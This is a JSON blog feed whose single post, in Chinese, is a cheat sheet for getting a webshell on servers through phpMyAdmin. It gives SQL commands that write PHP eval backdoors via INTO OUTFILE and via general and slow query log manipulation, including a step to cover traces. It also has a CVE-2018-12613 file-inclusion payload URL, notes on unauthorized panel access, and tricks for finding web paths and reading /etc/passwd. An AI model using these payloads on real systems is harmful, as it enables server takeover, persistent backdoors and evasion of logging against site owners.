{
    "version": "https://jsonfeed.org/version/1",
    "title": "月のブログ",
    "subtitle": "时光如白驹过隙",
    "icon": "https://mo-onstudy.com/images/favicon.ico",
    "description": "",
    "home_page_url": "https://mo-onstudy.com",
    "items": [
        {
            "id": "https://mo-onstudy.com/2022/01/13/phpmyadmin%E5%90%8E%E5%8F%B0getshell/",
            "url": "https://mo-onstudy.com/2022/01/13/phpmyadmin%E5%90%8E%E5%8F%B0getshell/",
            "title": "phpmyadmin后台getshell",
            "date_published": "2022-01-13T02:41:37.000Z",
            "content_html": "<h2 id=\"select-into-outfile写入\"><a class=\"anchor\" href=\"#select-into-outfile写入\">#</a> select into outfile 写入</h2>\n<h3 id=\"利用条件\"><a class=\"anchor\" href=\"#利用条件\">#</a> 利用条件</h3>\n<ul>\n<li>对 web 目录需要有写权限能够使用单引号 (root)</li>\n<li>知道网站绝对路径 (通过 phpinfo/php 探针 / 报错等)</li>\n<li>secure_file_priv 没有具体值</li>\n</ul>\n<h3 id=\"利用步骤\"><a class=\"anchor\" href=\"#利用步骤\">#</a> 利用步骤</h3>\n<pre><code class=\"language-mysql\"># 查询secure_file_priv值\nshow global variables like '%secure%';\n\n# 写入shell\nselect '&lt;?php eval($_POST[1]);?&gt;' INTO OUTFILE 'C:\\\\phpStudy\\\\WWW\\\\shell.php'\n</code></pre>\n<p>关于 secure_file_priv：</p>\n<p><code>secure_file_priv</code>  是用来限制 load dumpfile、into outfile、load_file () 函数在哪个目录下拥有上传或者读取文件的权限</p>\n<p>当  <code>secure_file_priv</code>  的值为 NULL ，表示限制 mysqld 不允许导入 | 导出，此时无法提权</p>\n<p>当  <code>secure_file_priv</code>  的值为 /tmp/ ，表示限制 mysqld 的导入 | 导出只能发生在 /tmp/ 目录下，此时也无法提权</p>\n<p>当  <code>secure_file_priv</code>  的值没有具体值时，表示不对 mysqld 的导入 | 导出做限制，此时可提权</p>\n<p><code>secure_file_priv</code>  这个值是只读变量，只能通过配置文件修改。如果管理员没有配置，无法进行写入 shell</p>\n<h2 id=\"全局日志写入shell\"><a class=\"anchor\" href=\"#全局日志写入shell\">#</a> 全局日志写入 shell</h2>\n<h3 id=\"利用条件-2\"><a class=\"anchor\" href=\"#利用条件-2\">#</a> 利用条件</h3>\n<ul>\n<li>必须是 root 权限</li>\n</ul>\n<h3 id=\"利用步骤-2\"><a class=\"anchor\" href=\"#利用步骤-2\">#</a> 利用步骤</h3>\n<pre><code class=\"language-mysql\"># 查看配置\nSHOW VARIABLES LIKE '%general%'\n\n# 开启general_log模式\nset global general_log = on;\n\n# 设置日志目录\nset global general_log_file='C:\\\\phpStudy\\\\WWW\\\\shell.php';\n\n# 写入shell\nselect '&lt;?php eval($_POST[cmd]);?&gt;'\n\n# 清除痕迹\nset global general_log_file='C:\\\\phpStudy\\\\MySQL\\\\data\\\\stu1.log';\nset global general_log = off;\n</code></pre>\n<h2 id=\"慢查询日志getshell\"><a class=\"anchor\" href=\"#慢查询日志getshell\">#</a> 慢查询日志 getshell</h2>\n<ul>\n<li>记录所有执行时间超过 long_query_time 秒的所有查询或者不使用索引的查询。默认情况下，MySQL 数据库是不开启慢查询日志的，long_query_time 的默认值为 10（即 10 秒，通常设置为 1 秒），即运行 10 秒以上的语句是慢查询语句。</li>\n</ul>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 查询慢查询日志</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">show</span> variables <span class=\"token operator\">like</span> <span class=\"token string\">'%slow%'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># 启用慢查询日志</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">set</span> <span class=\"token keyword\">GLOBAL</span> slow_query_log<span class=\"token operator\">=</span><span class=\"token keyword\">on</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># 设置日志路径</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>slow_query_log_file<span class=\"token operator\">=</span><span class=\"token string\">'C:/phpstudy_pro/WWW/2.php'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\"># 写入 shell</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">select</span> <span class=\"token string\">'&lt;?php phpinfo() ?>'</span> <span class=\"token keyword\">from</span> mysql<span class=\"token punctuation\">.</span>db <span class=\"token keyword\">where</span> sleep<span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h2 id=\"其他漏洞\"><a class=\"anchor\" href=\"#其他漏洞\">#</a> 其他漏洞</h2>\n<h3 id=\"cve-2018-12613\"><a class=\"anchor\" href=\"#cve-2018-12613\">#</a> Cve-2018-12613</h3>\n<ul>\n<li>phpMyAdmin 4.8.1 和 4.8.0</li>\n</ul>\n<pre><code class=\"language-payload\">http://0-sec.org/index.php?target=db_sql.php%253f/../../../../../../../../windows/win.ini\n</code></pre>\n<h3 id=\"cve-2016-5734\"><a class=\"anchor\" href=\"#cve-2016-5734\">#</a> Cve-2016-5734</h3>\n<ul>\n<li>4.0.10.16 之前的 4.0.x 版本</li>\n<li>4.4.15.7 之前的 4.4.x 版本</li>\n<li>4.6.3 之前的 4.6.x 版本</li>\n</ul>\n<h3 id=\"宝塔phpmyadmin未授权访问漏洞\"><a class=\"anchor\" href=\"#宝塔phpmyadmin未授权访问漏洞\">#</a> 宝塔 phpmyadmin 未授权访问漏洞</h3>\n<ul>\n<li>Linux 正式版 7.4.2 Linux 测试版 7.5.13 Windows 正式版 6.8</li>\n</ul>\n<pre><code class=\"language-payload\">http://xxx.xxx.xxx.xxx:888/pma \n</code></pre>\n<h2 id=\"绝对路径\"><a class=\"anchor\" href=\"#绝对路径\">#</a> 绝对路径</h2>\n<h3 id=\"phpinfo\"><a class=\"anchor\" href=\"#phpinfo\">#</a> phpinfo</h3>\n<p>F12 查看源代码然后搜索 DOCUMENT ROOT 得知写入的绝对路径</p>\n<h3 id=\"报错信息\"><a class=\"anchor\" href=\"#报错信息\">#</a> 报错信息</h3>\n<p>通过各种 fuzz 尝试让目标报错，也有可能爆出绝对路径</p>\n<h3 id=\"集成web框架\"><a class=\"anchor\" href=\"#集成web框架\">#</a> 集成 web 框架</h3>\n<p>如果目标站点是利用 phpstudy、LAMPP 等之类搭建的，可以通过查看数据库路径再拆解 web 路径</p>\n<pre><code>show variables like '%datadir%';\n</code></pre>\n<h3 id=\"select-load_file\"><a class=\"anchor\" href=\"#select-load_file\">#</a> select load_file()</h3>\n<p>利用 select load_file () 读取文件，可以尝试 /etc/passwd，apache｜nginx｜httpd log 之类的文件</p>\n<p>Trick：如何判断目录是否存在，往往确定了 /var/www/html 目录，但是还有一层目录不能确定，可以采用目标域名 + 常用的网站根目录的方式进行爆破，当使用</p>\n<pre><code>select 'test' into outfile '/var/www/$fuzz$/shell.php'；\n</code></pre>\n<p>时，目录 fuzz，fuzz 不存在将会报错</p>\n<pre><code>Can't create/write to file '/var/www/html/666.txt' (Errcode: 2)；\n</code></pre>\n<p>如果存在但是目录写不进去将返回 (Errcode: 13)</p>\n<p>如果使用的</p>\n<pre><code>load data infile &quot;/etc/passwd&quot; into table test;\n</code></pre>\n<p>该语句执行后将也会显示文件是否存在，有权限能否写等信息。</p>\n<h3 id=\"其他\"><a class=\"anchor\" href=\"#其他\">#</a> 其他</h3>\n<ul>\n<li>\n<p>查看数据库表内容获取 有一些 cms 会保存网站配置文件 或者路径</p>\n</li>\n<li>\n<p>进入后台</p>\n</li>\n<li>\n<p>百度出错信息 zoomeye shadon 搜索 error warning</p>\n</li>\n<li>\n<p>@@datadir 参数看 mysql 路径 反猜绝对路径</p>\n</li>\n</ul>\n",
            "tags": [
                "phpmyadmin",
                "getsehll"
            ]
        }
    ]
}